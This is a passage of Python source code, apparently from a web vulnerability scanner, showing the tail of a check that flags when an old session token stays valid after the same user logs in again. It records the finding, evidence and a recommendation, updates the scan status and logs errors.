                            "even after the legitimate user logs in from another location.",
                    recommendation="Implement proper session management that invalidates previous sessions when "
                                    "a new session is created for the same user account.",
                    evidence={
                        'token_1_status': token_1_status,
                        'token_2_status': token_2_status,
                        'test_api': authenticated_api['url'],
                        'login_api': login_api['url']
                    }
                )
            else:
                self.create_log(scan, 'INFO', 'No vulnerability found: Proper session management detected', 
                                'NO_VULNERABILITY')
            
            # Update scan status
            scan.vulnerability_found = vulnerability_found
            scan.status = 'completed'
            scan.completed_at = timezone.now()
            scan.save()
            
            self.create_log(scan, 'INFO', 'Vulnerability scan completed successfully', 'SCAN_COMPLETE')
            
            return scan
            
        except Exception as e:
            error_message = str(e)
            scan.status = 'failed'
            scan.error_message = error_message
            scan.save()
            
            self.create_log(scan, 'ERROR', f'Scan failed: {error_message}', 'SCAN_FAILED')
            raise e
